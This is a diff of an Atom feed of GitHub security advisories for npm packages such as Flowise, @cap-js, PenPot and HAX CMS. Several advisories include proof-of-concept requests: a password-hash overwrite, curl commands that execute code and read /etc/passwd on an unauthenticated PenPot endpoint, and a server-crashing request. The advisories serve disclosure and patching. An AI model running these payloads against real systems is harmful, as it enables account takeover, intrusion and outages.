@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-05-20T15:00:16.086Z</updated>
+    <updated>2026-05-20T16:16:17.103Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,356 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[flowise] Flowise: Cross-Workspace Chatflow Disclosure via chatflows/apikey Endpoint Returns All Unprotected Chatflows]]></title>
+        <id>https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</id>
+        <link href="https://github.com/advisories/GHSA-c2c9-mfw7-p8hw"/>
+        <updated>2026-05-20T15:45:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>/api/v1/chatflows/apikey/:apikey</code> endpoint (whitelisted, accessible with API key auth only) returns all chatflows bound to the provided API key AND all chatflows across the entire system that have no API key assigned. This crosses workspace boundaries, allowing a user in Workspace A who has a valid API key to read the full configuration (including flowData, chatbotConfig, system prompts, and node configurations) of chatflows from Workspace B, Workspace C, and all other workspaces, as long as those chatflows have no API key assigned.</p>
+<h2 id="details">Details</h2>
+<p>The controller at <code>packages/server/src/controllers/chatflows/index.ts:90-107</code> validates the API key and calls the service:</p>
+<pre><code class="language-typescript">const getChatflowByApiKey = async (req: Request, res: Response, next: NextFunction) =&gt; {
+    try {
+        const apikey = await apiKeyService.getApiKey(req.params.apikey)
+        if (\!apikey) {
+            return res.status(401).send("Unauthorized")
+        }
+        const apiResponse = await chatflowsService.getChatflowByApiKey(apikey.id, req.query.keyonly)
+        return res.json(apiResponse)  // Returns full chatflow objects with flowData
+    } catch (error) {
+        next(error)
+    }
+}
+</code></pre>
+<p>The service at <code>packages/server/src/services/chatflows/index.ts:223-245</code> builds the database query:</p>
+<pre><code class="language-typescript">const getChatflowByApiKey = async (apiKeyId: string, keyonly?: unknown): Promise&lt;any&gt; =&gt; {
+    const appServer = getRunningExpressApp()
+    let query = appServer.AppDataSource.getRepository(ChatFlow)
+        .createQueryBuilder("cf")
+        .where("cf.apikeyid = :apikeyid", { apikeyid: apiKeyId })
+    if (keyonly === undefined) {
+        // When keyonly is not set (default), also return ALL chatflows with no API key
+        query = query.orWhere("cf.apikeyid IS NULL").orWhere("cf.apikeyid = ''")
+    }
+    const dbResponse = await query.orderBy("cf.name", "ASC").getMany()
+    return dbResponse  // Returns full ChatFlow entities including flowData
+}
+</code></pre>
+<p>When <code>keyonly</code> is not provided as a query parameter (which is the default case), the query expands to include:</p>
+<ul>
+<li>All chatflows bound to the provided API key (same workspace, expected behavior)</li>
+<li>ALL chatflows with <code>apikeyid IS NULL</code> (any workspace, no workspace filter)</li>
+<li>ALL chatflows with empty <code>apikeyid</code> (any workspace, no workspace filter)</li>
+</ul>
+<p>There is NO <code>workspaceId</code> filter in this query. The response includes the full <code>ChatFlow</code> entity, which contains:</p>
+<ul>
+<li><code>flowData</code> - the complete workflow graph including system prompts, model names, internal URLs, custom code</li>
+<li><code>chatbotConfig</code> - chatbot configuration including allowed origins</li>
+<li><code>apiConfig</code> - API configuration and override settings</li>
+<li><code>textToSpeech</code> / <code>speechToText</code> - TTS/STT configuration including credential IDs</li>
+<li><code>analytic</code> - analytics configuration</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Attacker has a valid API key for Workspace A
+API_KEY="&lt;attacker-workspace-a-api-key&gt;"
+
+# Step 2: Query the chatflows/apikey endpoint WITHOUT keyonly parameter
+# Returns the attacker chatflows PLUS all chatflows without API keys from ALL workspaces
+curl -s "http://localhost:3000/api/v1/chatflows/apikey/" | jq ".[].workspaceId"
+
+# Step 3: With keyonly parameter, only chatflows bound to the API key are returned
+curl -s "http://localhost:3000/api/v1/chatflows/apikey/?keyonly=true" | jq ".[].workspaceId"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Cross-Workspace Information Disclosure</strong>: A user in any workspace can read the full configuration of chatflows from all other workspaces that do not have an API key assigned. This breaks workspace isolation.</li>
+<li><strong>Intellectual Property Exposure</strong>: System prompts, custom function code, and workflow architecture of chatflows from other workspaces/organizations are exposed.</li>
+<li><strong>Credential Reference Leakage</strong>: The <code>textToSpeech</code> and <code>speechToText</code> fields include credential IDs, which can be abused via the TTS generate endpoint.</li>
+<li><strong>Amplified by Default</strong>: Most chatflows are created without an API key assigned (API keys are opt-in), so the majority of chatflows in a multi-workspace deployment are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add workspace scoping to the <code>getChatflowByApiKey</code> query by passing the API key workspace ID and filtering the OR clause:</p>
+<pre><code class="language-typescript">// packages/server/src/services/chatflows/index.ts
+const getChatflowByApiKey = async (apiKeyId: string, keyonly?: unknown, workspaceId?: string): Promise&lt;any&gt; =&gt; {
+    const appServer = getRunningExpressApp()
+    let query = appServer.AppDataSource.getRepository(ChatFlow)
+        .createQueryBuilder("cf")
+        .where("cf.apikeyid = :apikeyid", { apikeyid: apiKeyId })
+    if (keyonly === undefined &amp;&amp; workspaceId) {
+        // Only include unprotected chatflows from the SAME workspace
+        query = query.orWhere(
+            "(cf.apikeyid IS NULL OR cf.apikeyid = :empty) AND cf.workspaceId = :workspaceId",
+            { empty: "", workspaceId }
+        )
+    }
+    const dbResponse = await query.orderBy("cf.name", "ASC").getMany()
+    return dbResponse
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-c2c9-mfw7-p8hw">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-c2c9-mfw7-p8hw</a></li>
+<li><a href="https://github.com/advisories/GHSA-c2c9-mfw7-p8hw">https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-20T15:45:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[flowise] Flowise: Mass Assignment in PUT /api/v1/user Allows Authenticated Users to Override Password Hash and Bypass Password Change Verification]]></title>
+        <id>https://github.com/advisories/GHSA-59fh-9f3p-7m39</id>
+        <link href="https://github.com/advisories/GHSA-59fh-9f3p-7m39"/>
+        <updated>2026-05-20T15:44:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Mass Assignment vulnerability in the PUT /api/v1/user endpoint allows authenticated users to directly modify restricted user fields, including the credential (password hash), bypassing the intended password change workflow.</p>
+<p>Because the endpoint forwards the entire request body to the service layer without filtering, an attacker can override the credential field without providing the current password.</p>
+<p>This bypasses several security protections including:</p>
+<ul>
+<li>old password verification</li>
+<li>password hashing enforcement</li>
+<li>password policy validation</li>
+<li>session invalidation on password change</li>
+</ul>
+<p>While the vulnerability cannot be used to modify other users due to an ID check in the controller, it allows attackers who obtain a temporary session (e.g., via token theft or XSS) to establish persistent account access.</p>
+<h3 id="details">Details</h3>
+<p>The endpoint <strong>PUT /api/v1/user</strong> allows authenticated users to update their user profile.</p>
+<p>The controller checks that the authenticated user matches the provided id, preventing direct IDOR:</p>
+<pre><code class="language-typescript">const currentUser = req.user
+const { id } = req.body
+
+if (currentUser.id !== id) {
+    throw new InternalFlowiseError(StatusCodes.FORBIDDEN)
+}
+</code></pre>
+<p>However, the controller forwards the entire request body directly to the service layer without filtering:</p>
+<pre><code class="language-typescript">const user = await userService.updateUser(req.body)
+</code></pre>
+<p>Inside UserService.updateUser, the incoming data is merged into the existing user entity:</p>
+<pre><code class="language-typescript">updatedUser = queryRunner.manager.merge(User, oldUserData, newUserData)
+</code></pre>
+<p>Because newUserData is derived from req.body and there is no field allowlist, any field present in the User entity may be modified.</p>
+<p>This includes sensitive fields such as:</p>
+<ul>
+<li>credential</li>
+<li>tempToken</li>
+<li>tokenExpiry</li>
+<li>status</li>
+<li>email</li>
+</ul>
+<p>The service implements a secure password change workflow that requires the following fields:</p>
+<pre><code class="language-typescript">oldPassword
+newPassword
+confirmPassword
+</code></pre>
+<p>Example code:</p>
+<pre><code class="language-typescript">if (newUserData.oldPassword &amp;&amp; newUserData.newPassword &amp;&amp; newUserData.confirmPassword) {
+    if (!compareHash(newUserData.oldPassword, oldUserData.credential)) {
+        throw new InternalFlowiseError(StatusCodes.BAD_REQUEST)
+    }
+
+    newUserData.credential = this.encryptUserCredential(newUserData.newPassword)
+}
+</code></pre>
+<p>However, this logic can be bypassed by directly supplying a credential value in the request body.</p>
+<p>Because the merge operation applies all fields from newUserData, the supplied credential hash will overwrite the stored password hash.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Step 1 -  Authenticate</strong></p>
+<p>Login as any normal user and obtain a valid JWT token.</p>
+<p><strong>POST /api/v1/auth/login</strong></p>
+<p><strong>Step 2 - Generate a password hash</strong></p>
+<p>Generate a bcrypt hash for a password you control.</p>
+<p>Example:</p>
+<p>bcrypt("attacker_password")</p>
+<p>Example hash:</p>
+<p>$2b$10$abc123examplehashvalue...</p>
+<p>Step 3 - Send crafted update request</p>
+<pre><code class="language-http">PUT /api/v1/user
+Authorization: Bearer &lt;JWT_TOKEN&gt;
+Content-Type: application/json
+
+{
+  "id": "&lt;your-user-id&gt;",
+  "credential": "$2b$10$abc123examplehashvalue..."
+}
+</code></pre>
+<p>Step 4 - Login with attacker password</p>
+<p>The password hash in the database is replaced by the supplied value.</p>
+<p>The attacker can now authenticate using:</p>
+<p><strong>attacker_password</strong></p>
+<p>without ever providing the previous password.</p>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to bypass the password change security controls.</p>
+<p>Security protections that are bypassed include:</p>
+<p>current password verification</p>
+<p>password hashing enforcement</p>
+<p>password policy validation</p>
+<p>session invalidation on password change</p>
+<p>Although the controller prevents modification of other users' accounts, the vulnerability enables persistence after account compromise.</p>
+<p>Example attack scenario:</p>
+<ul>
+<li>An attacker temporarily obtains a user's session (XSS, token leak, shared device, etc.)</li>
+<li>The attacker sends the crafted update request with a new password hash</li>
+<li>The attacker now permanently controls the account</li>
+<li>Authentication logic bypass</li>
+<li>Privilege persistence after compromise</li>
+<li>Weak account recovery guarantees</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-59fh-9f3p-7m39">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-59fh-9f3p-7m39</a></li>
+<li><a href="https://github.com/advisories/GHSA-59fh-9f3p-7m39">https://github.com/advisories/GHSA-59fh-9f3p-7m39</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-59fh-9f3p-7m39</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-20T15:44:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[flowise] Flowise: Hardcoded CORS wildcard on TTS endpoint enables cross-origin credential abuse from any webpage]]></title>
+        <id>https://github.com/advisories/GHSA-m837-xvxr-vqwg</id>
+        <link href="https://github.com/advisories/GHSA-m837-xvxr-vqwg"/>
+        <updated>2026-05-20T15:38:05.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The TTS generation endpoint sets <code>Access-Control-Allow-Origin: *</code> as a hardcoded response header, independent of the server's CORS configuration. This enables any webpage to make cross-origin requests to generate speech using stored credentials.</p>
+<h3 id="root-cause">Root Cause</h3>
+<pre><code class="language-typescript">// packages/server/src/controllers/text-to-speech/index.ts:83
+res.setHeader('Access-Control-Allow-Origin', '*')
+res.setHeader('Access-Control-Allow-Headers', 'Cache-Control')
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Cross-origin credential abuse — any webpage can trigger TTS using stored credentials</li>
+<li>Bypasses the server's CORS policy (<code>getCorsOptions()</code>) which is otherwise restrictive by default</li>
+<li>Combined with Finding 3 (TTS credential abuse), enables drive-by credential abuse via malicious webpages</li>
+</ul>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Remove the hardcoded CORS wildcard and let the server's CORS middleware handle the headers:</p>
+<pre><code class="language-typescript">// Remove these lines:
+// res.setHeader('Access-Control-Allow-Origin', '*')
+// res.setHeader('Access-Control-Allow-Headers', 'Cache-Control')
+</code></pre>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><code>packages/server/src/controllers/text-to-speech/index.ts</code> line 83</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m837-xvxr-vqwg">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m837-xvxr-vqwg</a></li>
+<li><a href="https://github.com/advisories/GHSA-m837-xvxr-vqwg">https://github.com/advisories/GHSA-m837-xvxr-vqwg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m837-xvxr-vqwg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-20T15:38:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@cap-js/db-service]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
+        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
+        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
+        <updated>2026-05-20T15:33:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
+The malicious packages harvested credentials and attempted self-propagation.
+If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
+If a compromised version was ever installed, rotate all affected credentials.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workarounds.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
+<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
+<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
+<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-20T15:33:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@cap-js/postgres]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
+        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
+        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
+        <updated>2026-05-20T15:33:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
+The malicious packages harvested credentials and attempted self-propagation.
+If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
+If a compromised version was ever installed, rotate all affected credentials.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workarounds.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
+<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
+<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
+<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-20T15:33:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@cap-js/sqlite]  Supply chain compromise via malicious package versions (@cap-js/sqlite,  @cap-js/postgres, @cap-js/db-service)]]></title>
+        <id>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</id>
+        <link href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8"/>
+        <updated>2026-05-20T15:33:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>On April 29, 2026, compromised versions of <code>@cap-js/sqlite@2.2.2</code>, <code>@cap-js/postgres@2.2.2</code>, and <code>@cap-js/db-service@2.10.1</code> were published.
+The malicious packages harvested credentials and attempted self-propagation.
+If a compromised version was installed, all credentials accessible on that machine (npm tokens, cloud provider credentials, SSH keys, GitHub PATs) should be considered compromised.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to <code>@cap-js/sqlite</code> &gt;= 2.4.0, <code>@cap-js/postgres</code> &gt;= 2.3.0, <code>@cap-js/db-service</code> &gt;= 2.11.0.
+If a compromised version was ever installed, rotate all affected credentials.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workarounds.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/cap-js/cds-dbs/security/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+<li><a href="https://me.sap.com/notes/3747787">https://me.sap.com/notes/3747787</a></li>
+<li><a href="https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html">https://www.sap.com/documents/2026/05/8203a8b9-4d7f-0010-bca6-c68f7e60039b.html</a></li>
+<li><a href="https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared">https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared</a></li>
+<li><a href="https://github.com/advisories/GHSA-pvw4-cvr4-97p8">https://github.com/advisories/GHSA-pvw4-cvr4-97p8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pvw4-cvr4-97p8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-20T15:33:04.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[pm2] pm2 Regular Expression Denial of Service vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</id>
@@ -1097,278 +1447,5 @@ It's important to remember that route middleware does not run when rendering isl
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-05-19T20:03:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@penpot/mcp] PenPot MCP REPL server binds to 0.0.0.0 with unauthenticated /execute endpoint — RCE]]></title>
-        <id>https://github.com/advisories/GHSA-22qr-rp27-j9wm</id>
-        <link href="https://github.com/advisories/GHSA-22qr-rp27-j9wm"/>
-        <updated>2026-05-19T19:57:37.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The MCP module's <code>ReplServer</code> binds to all interfaces (<code>0.0.0.0:4403</code>) and exposes a <code>/execute</code> endpoint that runs arbitrary code with zero authentication. Anyone on the network can POST JavaScript and it runs on the server. The main <code>PenpotMcpServer</code> was partially fixed for a similar binding issue (#8683), but <code>ReplServer.ts</code> was missed.</p>
-<h3 id="details">Details</h3>
-<p><code>mcp/packages/server/src/ReplServer.ts:89</code>:</p>
-<pre><code class="language-typescript">this.server = this.app.listen(this.port, () =&gt; {
-    // NO HOST ARGUMENT — Express defaults to 0.0.0.0
-</code></pre>
-<p>Compare with <code>PenpotMcpServer.ts:301</code> which correctly binds to <code>this.host</code> (default <code>"localhost"</code>):</p>
-<pre><code class="language-typescript">this.app.listen(this.port, this.host, async () =&gt; {
-</code></pre>
-<p>The <code>/execute</code> endpoint at <code>ReplServer.ts:52-79</code>:</p>
-<pre><code class="language-typescript">this.app.post("/execute", async (req, res) =&gt; {
-    const { code } = req.body;
-    // No auth check. Executes code via PluginBridge.executePluginTask()
-    const task = new ExecuteCodePluginTask({ code });
-    const result = await this.pluginBridge.executePluginTask(task);
-</code></pre>
-<p>No auth middleware, no token check, no nothing. POST JSON with a <code>code</code> field and it runs.</p>
-<p>This was partially flagged in #8683 (March 2026), which noted that <code>PenpotMcpServer.ts</code> was binding to <code>0.0.0.0</code>. PR #8686 attempted a fix but was closed without merging, and it only touched <code>PenpotMcpServer.ts</code> and <code>vite.config.ts</code> — <code>ReplServer.ts</code> wasn't in the diff. On current develop, <code>ReplServer.ts</code> line 89 still calls <code>listen(this.port)</code> with no host argument.</p>
-<h3 id="poc">PoC</h3>
-<p>I ran the ReplServer with Express (matching the actual dependency) and tested from localhost and from a Docker container on the same network.</p>
-<pre><code class="language-bash">$ node server.js
-REPL server started on port 4403
-Bound to: :::4403
-All interfaces: YES
-</code></pre>
-<p><strong>Unauthenticated code execution:</strong></p>
-<pre><code class="language-bash">$ curl -s -X POST http://localhost:4403/execute \
-    -H "Content-Type: application/json" \
-    -d '{"code":"require(\"os\").hostname()"}'
-{"success":true,"result":"kali"}
-
-$ curl -s -X POST http://localhost:4403/execute \
-    -H "Content-Type: application/json" \
-    -d '{"code":"require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\").split(\"\\n\").slice(0,3).join(\"\\n\")"}'
-{"success":true,"result":"root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"}
-
-$ curl -s -X POST http://localhost:4403/execute \
-    -H "Content-Type: application/json" \
-    -d '{"code":"require(\"child_process\").execSync(\"id\").toString()"}'
-{"success":true,"result":"uid=1000(kali) gid=1000(kali) groups=1000(kali)...\n"}
-
-$ curl -s -X POST http://localhost:4403/execute \
-    -H "Content-Type: application/json" \
-    -d '{"code":"JSON.stringify(Object.keys(process.env).slice(0,5))"}'
-{"success":true,"result":"[\"SHELL\",\"SESSION_MANAGER\",\"WINDOWID\",\"QT_ACCESSIBILITY\",\"COLORTERM\"]"}
-</code></pre>
-<p><strong>Binding verification:</strong></p>
-<pre><code>$ ss -tlnp | grep 4403
-LISTEN  0  511  *:4403  *:*  users:(("node",pid=696955,fd=21))
-</code></pre>
-<p>Listening on <code>*:4403</code> — all interfaces.</p>
-<p><strong>Remote access from Docker container:</strong></p>
-<pre><code class="language-bash">$ docker exec penpot-backend curl -s http://172.18.0.1:4403/
-REPL Server - Penpot MCP (no auth)
-</code></pre>
-<p>Reachable from any container on the Docker network.</p>
-<h3 id="impact">Impact</h3>
-<p>Unauthenticated RCE on any machine running the MCP module. Read files, execute commands, dump environment variables (which often contain database credentials, API keys, secrets). The MCP module isn't part of the default Docker deployment, but developers and teams using the MCP integration for AI-assisted design work would run it locally. In shared development environments or CI/CD, the exposed port is reachable from the network.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Two lines:</p>
-<ol>
-<li>Add a <code>host</code> parameter to the listen call in <code>ReplServer.ts:89</code>:</li>
-</ol>
-<pre><code class="language-typescript">this.server = this.app.listen(this.port, 'localhost', () =&gt; {
-</code></pre>
-<ol start="2">
-<li>Add authentication to the <code>/execute</code> endpoint. Even a shared secret from an environment variable would be better than nothing.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/penpot/penpot/security/advisories/GHSA-22qr-rp27-j9wm">https://github.com/penpot/penpot/security/advisories/GHSA-22qr-rp27-j9wm</a></li>
-<li><a href="https://github.com/advisories/GHSA-22qr-rp27-j9wm">https://github.com/advisories/GHSA-22qr-rp27-j9wm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22qr-rp27-j9wm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-19T19:57:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAX CMS: Denial of Service using Malicious Import Request]]></title>
-        <id>https://github.com/advisories/GHSA-9r33-xhw8-4qqp</id>
-        <link href="https://github.com/advisories/GHSA-9r33-xhw8-4qqp"/>
-        <updated>2026-05-19T19:51:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The HAX CMS NodeJS application crashes when an authenticated attacker sends a specially crafted site creation request to the createSite endpoint. A single request is sufficient to take the entire application offline, requiring a manual server restart to restore service.</p>
-<h3 id="details">Details</h3>
-<p>The <code>createSite</code> remote import flow does <strong>not</strong> complete end-to-end. Instead, the server crashes before the outbound HTTP fetch happens.</p>
-<p>The crash occurs because <code>createSite</code> passes a file object without <code>originalname</code>, while <code>HAXCMSFile.save()</code> immediately dereferences <code>tmpFile.originalname.replace(...)</code>.</p>
-<p>As a result:</p>
-<ul>
-<li>the request reaches privileged code inside <code>createSite</code></li>
-<li>the server hits the remote file handling path</li>
-<li>the process crashes before <code>downloadAndSaveFile()</code> performs the outbound request</li>
-<li>no imported file is written into the site directory</li>
-</ul>
-<h3 id="affected-resources">Affected Resources</h3>
-<ul>
-<li>src/routes/createSite.js:176</li>
-<li>src/lib/HAXCMSFile.js:25</li>
-<li>system/api/createSite</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Obtain a JWT by logging in with valid credentials.</li>
-</ol>
-<pre><code class="language-bash">JWT=$(curl -s -X POST 'http://127.0.0.1:3000/system/api/login' \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"admin","password":"admin"}' | grep -o '"jwt":"[^"]*"' | head -1 | cut -d'"' -f4)
-</code></pre>
-<ol start="2">
-<li>Extract the required tokens from the <code>connectionSettings</code> endpoint.</li>
-</ol>
-<pre><code class="language-bash">SETTINGS=$(curl -s 'http://127.0.0.1:3000/system/api/connectionSettings')
-ROOT_TOKEN=$(printf '%s' "$SETTINGS" | grep -o '"token":"[^"]*"' | head -1 | cut -d'"' -f4)
-USER_TOKEN=$(printf '%s' "$SETTINGS" | grep -o 'createSite[^"]*' | grep -o 'user_token=[^"&amp;]*' | cut -d'=' -f2)
-</code></pre>
-<ol start="3">
-<li>Send the malformed request to crash the server.</li>
-</ol>
-<pre><code class="language-bash">curl -i -X POST "http://127.0.0.1:3000/system/api/createSite?user_token=$USER_TOKEN&amp;jwt=$JWT" \
-  -H 'Content-Type: application/json' \
-  -d "{
-    \"token\": \"$ROOT_TOKEN\",
-    \"site\": { \"name\": \"dos-poc\" },
-    \"theme\": {},
-    \"build\": {
-      \"structure\": \"import\",
-      \"type\": \"import\",
-      \"items\": [],
-      \"files\": {
-        \"files/poc.txt\": \"http://127.0.0.1:8888/poc.txt\"
-      }
-    }
-  }"
-</code></pre>
-<img width="953" height="433" alt="Empty-Reply" src="https://github.com/user-attachments/assets/f3562726-2e64-4af6-a06c-8356dc7708da">
-
-
-<p>The curl client receives an empty reply as the server crashes mid-request. The Node.js process terminates immediately with TypeError: Cannot read properties of undefined (reading 'replace') and nodemon reports the application as crashed.</p>
-<img width="950" height="278" alt="crash-detail" src="https://github.com/user-attachments/assets/1fbc80fb-4c2d-4bc6-af29-c3e9c45e8ad1">
-
-
-<h3 id="impact">Impact</h3>
-<p>An authenticated attacker can crash the HAX CMS NodeJS process with a single HTTP request, making the application unavailable to all users until the server is manually restarted. Since HAX CMS allows account registration, an attacker does not need to compromise existing credentials; they can create their own account and immediately use it to trigger the crash.</p>
-<h3 id="references">References</h3>
-<ul>
